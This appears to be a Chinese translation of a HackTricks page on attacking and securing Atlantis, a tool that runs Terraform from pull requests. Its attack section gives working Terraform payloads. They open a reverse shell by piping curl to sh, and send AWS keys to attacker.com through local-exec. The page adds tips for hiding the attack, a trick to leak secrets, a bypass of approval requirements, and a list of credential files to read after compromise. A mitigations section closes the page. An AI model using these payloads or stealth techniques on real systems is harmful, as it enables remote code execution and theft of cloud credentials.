# Atlantis 安全性

<details>

<summary><strong>从零开始学习 AWS 黑客攻击成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

Atlantis 主要帮助您从 git 服务器的 Pull Requests 中运行 terraform。

![](<../.gitbook/assets/image (51).png>)

## 本地实验室

1. 转到 [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) 中的 **atlantis 发布页面** 并**下载**适合您的版本。
2. 创建您的 **github** 用户的**个人令牌**（具有仓库访问权限）
3. 执行 `./atlantis testdrive`，它将创建一个您可以用来**与 atlantis 通信**的**演示仓库**
4. 您可以在 127.0.0.1:4141 访问网页

## Atlantis 访问

### Git 服务器凭证

**Atlantis** 支持多个 git 主机，如 **Github**、**Gitlab**、**Bitbucket** 和 **Azure DevOps**。\
然而，为了访问这些平台上的仓库并执行操作，它需要被授予一些**特权访问**（至少写权限）。\
[**文档**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) 建议在这些平台上专门为 Atlantis 创建一个用户，但有些人可能会使用个人账户。

{% hint style="warning" %}
无论如何，从攻击者的角度来看，**Atlantis 账户**将是一个非常**有趣的** **攻击目标**。
{% endhint %}

### Webhooks

Atlantis 可以选择性地使用 [**Webhook 密钥**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) 来验证它从您的 Git 主机收到的 **webhooks** 是**合法的**。

确认这一点的一种方法是**仅允许来自您的 Git 主机 IP 的请求**，但更简单的方法是使用 Webhook 密钥。

请注意，除非您使用私有的 github 或 bitbucket 服务器，否则您需要将 webhook 端点暴露给互联网。

{% hint style="warning" %}
Atlantis 将**暴露 webhooks**，以便 git 服务器可以向其发送信息。从攻击者的角度来看，了解**是否可以向其发送消息**将是有趣的。
{% endhint %}

### 提供商凭证 <a href="#provider-credentials" id="provider-credentials"></a>

[根据文档：](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis 通过在**托管 Atlantis 的服务器上**简单地**执行 `terraform plan` 和 `apply`** 命令来运行 Terraform。就像您在本地运行 Terraform 一样，Atlantis 需要您特定提供商的凭证。

您如何为 Atlantis 提供特定提供商的凭证取决于您：

* Atlantis [Helm 图表](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) 和 [AWS Fargate 模块](https://www.runatlantis.io/docs/deployment.html#aws-fargate) 有自己的提供商凭证机制。阅读它们的文档。
* 如果您在云中运行 Atlantis，许多云有方法为在其上运行的应用程序提供云 API 访问权限，例如：
* [AWS EC2 角色](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)（搜索 "EC2 角色"）
* [GCE 实例服务账户](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* 许多用户设置环境变量，例如 `AWS_ACCESS_KEY`，在 Atlantis 运行的地方。
* 其他人在 Atlantis 运行的地方创建必要的配置文件，例如 `~/.aws/credentials`。
* 使用 [HashiCorp Vault 提供商](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) 获取提供商凭证。

{% hint style="warning" %}
**运行** **Atlantis** 的**容器**很可能会**包含**对提供商（AWS、GCP、Github 等）的**特权凭证**，Atlantis 通过 Terraform 管理这些提供商。
{% endhint %}

### 网页

默认情况下，Atlantis 会在 localhost 的端口 4141 上运行一个**网页**。这个页面只允许您启用/禁用 atlantis apply 并检查仓库的计划状态并解锁它们（它不允许修改事物，所以它不是那么有用）。

您可能不会发现它暴露给互联网，但看起来默认情况下**不需要凭证**来访问它（如果需要的话，`atlantis`:`atlantis` 是**默认**的）。

## 服务器配置

可以通过命令行标志、环境变量、配置文件或三者的混合来指定 `atlantis server` 的配置。

* 您可以在[**这里找到 Atlantis 服务器支持的标志列表**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* 您可以在[**这里找到如何将配置选项转换为环境变量**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

值是**按此顺序选择**的：

1. 标志
2. 环境变量
3. 配置文件

{% hint style="warning" %}
请注意，在配置中您可能会找到如**令牌和密码**等有趣的值。
{% endhint %}

### 仓库配置

一些配置影响**仓库的管理方式**。然而，可能**每个仓库需要不同的设置**，因此有方法可以指定每个仓库。这是优先顺序：

1. 仓库 [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) 文件。此文件可用于指定 atlantis 应如何处理仓库。然而，默认情况下，如果没有一些标志允许，这里不能指定一些键。
2. 可能需要通过像 `allowed_overrides` 或 `allow_custom_workflows` 这样的标志来允许
3. [**服务器端配置**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)：您可以使用标志 `--repo-config` 传递它，它是一个 yaml，为每个仓库配置新设置（支持正则表达式）
4. **默认**值

#### PR 保护

Atlantis 允许指示是否希望 **PR** 被其他人**`批准`**（即使分支保护中没有设置）和/或在**运行 apply 之前**是**`可合并的`**（通过了分支保护）。从安全角度来看，建议设置这两个选项。

如果 `allowed_overrides` 为 True，这些设置可以在每个项目的 `/atlantis.yml` 文件中**覆盖**。

#### 脚本

仓库配置可以**指定脚本**在**工作流执行前**（_预工作流钩子_）和**后**（_后工作流钩子_）运行。

没有任何选项允许在**仓库 `/atlantis.yml`** 文件中**指定**这些脚本。

#### 工作流

在仓库配置（服务器端配置）中，您可以[**指定一个新的默认工作流**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)，或[**创建新的自定义工作流**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**。** 您还可以**指定**哪些**仓库**可以**访问**生成的**新**工作流。\
然后，您可以允许每个仓库的 **atlantis.yaml** 文件**指定要使用的工作流。**

{% hint style="danger" %}
如果[**服务器端配置**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)标志 `allow_custom_workflows` 设置为 **True**，则可以在每个仓库的 **`atlantis.yaml`** 文件中**指定**工作流。还可能需要**`allowed_overrides`** 也指定**`workflow`** 来**覆盖**将要使用的工作流。\
这基本上会给任何可以访问该仓库的用户在 Atlantis 服务器上提供**远程代码执行（RCE）**的能力。
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest 策略检查

Atlantis 支持对计划输出运行**服务器端** [**conftest**](https://www.conftest.dev/) **策略**。使用此步骤的常见用例包括：

* 拒绝使用一系列模块
* 在创建时断言资源的属性
* 捕获无意中的资源删除
* 防止安全风险（例如，将安全端口暴露给公众）

您可以在 [**文档中**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) 查看如何配置它。

## Atlantis 命令

在 [**文档中**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) 你可以找到运行 Atlantis 的选项：
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## 攻击

{% hint style="warning" %}
如果在利用过程中你发现这个**错误**：`Error: Error acquiring the state lock`

你可以通过运行以下命令来修复：
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis 计划 RCE - 在新 PR 中修改配置

如果您对某个仓库有写权限，您将能够在其上创建一个新分支并生成一个 PR。如果您能够**执行 `atlantis plan`**（或者可能会自动执行），**您将能够在 Atlantis 服务器内部进行 RCE**。

您可以通过让 [**Atlantis 加载外部数据源**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) 来做到这一点。只需在 `main.tf` 文件中放入如下的有效载荷：
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### 更隐蔽的攻击

您可以通过遵循以下建议，以更**隐蔽的方式**执行此攻击：

* 不要直接在terraform文件中添加反向 shell，您可以**加载包含反向 shell 的外部资源**：
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
您可以在 [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) 找到反向 shell 代码

* 在外部资源中，使用 **ref** 功能在仓库中的一个分支内隐藏 **terraform 反向 shell 代码**，类似于：`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **不要** 创建 **PR 到 master** 来触发 Atlantis，**创建 2 个分支**（test1 和 test2）并从一个分支创建 **PR 到另一个分支**。攻击完成后，只需**删除 PR 和分支**。

### Atlantis 计划泄露秘密

您可以通过在 terraform 文件中放置类似以下内容，运行 `atlantis plan`（`terraform plan`）来**泄露 terraform 使用的秘密**：
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis apply RCE - 在新的 PR 中修改配置

如果您对某个仓库有写权限，您将能够在其上创建一个新分支并生成一个 PR。如果您能够**执行 `atlantis apply`，您将能够在 Atlantis 服务器内部进行 RCE**。

然而，您通常需要绕过一些保护措施：

* **Mergeable**：如果 Atlantis 设置了这个保护，您只能在 PR 可合并时**运行 `atlantis apply`**（这意味着需要绕过分支保护）。
* 检查潜在的[**分支保护绕过**](broken-reference/)
* **Approved**：如果 Atlantis 设置了这个保护，**必须有其他用户批准 PR**，您才能运行 `atlantis apply`
* 默认情况下，您可以滥用[**Gitbot 令牌来绕过这个保护**](broken-reference/)

在带有[**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)的恶意 Terraform 文件上运行**`terraform apply`**。\
您只需确保像下面这样的有效载荷最终出现在 `main.tf` 文件中：
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
遵循**前一技术的建议**以更**隐秘**的方式执行此攻击。

### Terraform 参数注入

当运行 `atlantis plan` 或 `atlantis apply` 时，terraform 在底层运行，你可以通过在 atlantis 中评论类似的内容来向 terraform 传递命令：
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
您可以传递的一项内容是环境变量，这可能有助于绕过某些保护措施。检查 terraform 环境变量 [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### 自定义工作流程

在 `atlantis.yaml` 文件中指定**恶意自定义构建命令**。Atlantis 使用来自拉取请求分支的 `atlantis.yaml` 文件，**而不是** `master` 分支的。\
这种可能性在前面的章节中提到过：

{% hint style="danger" %}
如果[**服务器端配置**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)标志 `allow_custom_workflows` 设置为 **True**，则可以在每个仓库的 **`atlantis.yaml`** 文件中**指定**工作流程。还可能需要 **`allowed_overrides`** 也指定 **`workflow`** 来**覆盖**将要使用的工作流程。

这基本上会给任何可以访问该仓库的用户在 Atlantis 服务器上提供**远程代码执行**的能力。
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### 绕过计划/应用保护

如果 [**服务器端配置**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) 标志 `allowed_overrides` _配置了_ `apply_requirements`，则仓库可以**修改计划/应用保护以绕过它们**。
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR 劫持

如果有人在你的有效拉取请求上发送 **`atlantis plan/apply` 评论**，它会导致 terraform 在你不希望它运行时运行。

此外，如果你没有在 **分支保护** 中配置要在 **新提交被推送** 到 PR 时重新评估每个 PR，那么有人可以 **编写恶意配置**（检查前面的场景）在 terraform 配置中，运行 `atlantis plan/apply` 并获得 RCE。

这是 Github 分支保护中的 **设置**：

![](<../.gitbook/assets/image (31).png>)

### Webhook 密钥

如果你设法 **窃取了 webhook 密钥** 或者 **没有使用任何 webhook 密钥**，你可以 **调用 Atlantis webhook** 并直接 **调用 atlatis 命令**。

### Bitbucket

Bitbucket Cloud **不支持 webhook 密钥**。这可能允许攻击者 **伪造来自 Bitbucket 的请求**。确保你只允许 Bitbucket IP。

* 这意味着 **攻击者** 可以向 Atlantis 发送 **伪造的请求**，看起来像是来自 Bitbucket。
* 如果你指定了 `--repo-allowlist`，那么他们只能伪造与这些仓库相关的请求，因此他们能造成的最大损害将是在你自己的仓库上进行 plan/apply。
* 为了防止这种情况，允许列表 [Bitbucket 的 IP 地址](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)（参见 Outbound IPv4 地址）。

## 事后利用

如果你设法访问了服务器，或者至少在服务器上获得了 LFI，有一些你应该尝试阅读的有趣内容：

* `/home/atlantis/.git-credentials` 包含 vcs 访问凭证
* `/atlantis-data/atlantis.db` 包含更多信息的 vcs 访问凭证
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform 状态文件
* 示例：/atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` 环境变量
* `/proc/[2-20]/cmdline` `atlantis server` 的命令行（可能包含敏感数据）

## 缓解措施

### 不要在公共仓库上使用 <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

因为任何人都可以在公共拉取请求上发表评论，即使有所有可用的安全缓解措施，如果没有正确配置安全设置，在公共仓库上运行 Atlantis 仍然是危险的。

### 不要使用 `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

如果你在公共仓库上运行（这不推荐，见上文），你不应该设置 `--allow-fork-prs`（默认为 false），因为任何人都可以从他们的 fork 向你的仓库发起拉取请求。

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis 要求你通过 `--repo-allowlist` 标志指定它将接受 webhooks 的仓库白名单。例如：

* 特定仓库：`--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* 你的整个组织：`--repo-allowlist=github.com/runatlantis/*`
* 你的 GitHub Enterprise 安装中的每个仓库：`--repo-allowlist=github.yourcompany.com/*`
* 所有仓库：`--repo-allowlist=*`。当你处于受保护的网络中时很有用，但如果没有设置 webhook 密钥，这样做很危险。

这个标志确保你的 Atlantis 安装不会被用于你无法控制的仓库。更多详情请参见 `atlantis server --help`。

### 保护 Terraform 计划 <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

如果攻击者提交带有恶意 Terraform 代码的拉取请求在你的威胁模型中，那么你必须意识到 `terraform apply` 批准是不够的。使用 [`external` 数据源](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) 或指定恶意提供者，可以在 `terraform plan` 中运行恶意代码。然后，这段代码可能会泄露你的凭证。

为了防止这种情况，你可以：

1. 将提供者内置到 Atlantis 镜像或主机中，并在生产中拒绝出口。
2. 内部实现提供者注册协议并拒绝公共出口，这样你就可以控制谁有权访问注册表。
3. 修改你的 [服务器端仓库配置](https://www.runatlantis.io/docs/server-side-repo-config.html) 的 `plan` 步骤，以验证是否使用了不允许的提供者或数据源，或者来自不允许用户的 PR。你还可以在这一点上添加额外的验证，例如，在允许 `plan` 继续之前要求 PR 上有 "点赞"。Conftest 在这里可能有用。

### Webhook 密钥 <a href="#webhook-secrets" id="webhook-secrets"></a>

应该通过 `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` 环境变量设置 Webhook 密钥来运行 Atlantis。即使设置了 `--repo-allowlist` 标志，如果没有 webhook 密钥，攻击者也可以伪装成允许列表中的仓库向 Atlantis 发出请求。Webhook 密钥确保 webhook 请求实际上是来自你的 VCS 提供商（GitHub 或 GitLab）。

如果你在使用 Azure DevOps，不是使用 webhook 密钥，而是添加基本的用户名和密码。

### Azure DevOps 基本认证 <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps 支持在所有 webhook 事件中发送基本认证头。这要求使用 HTTPS URL 作为你的 webhook 位置。

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

如果你正在使用 webhook 密钥，但你的流量是通过 HTTP 的，那么 webhook 密钥可能会被窃取。使用 `--ssl-cert-file` 和 `--ssl-key-file` 标志启用 SSL/HTTPS。

### 在 Atlantis Web 服务器上启用认证 <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

非常推荐在 web 服务中启用认证。使用 `--web-basic-auth=true` 启用 BasicAuth，并使用 `--web-username=yourUsername` 和 `--web-password=yourPassword` 标志设置用户名和密码。

你也可以将这些作为环境变量传递 `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` 和 `ATLANTIS_WEB_PASSWORD=yourPassword`。

## 参考资料

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 HackTricks 中看到你的 **公司广告** 或 **下载 HackTricks 的 PDF** 版本，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。

</details>
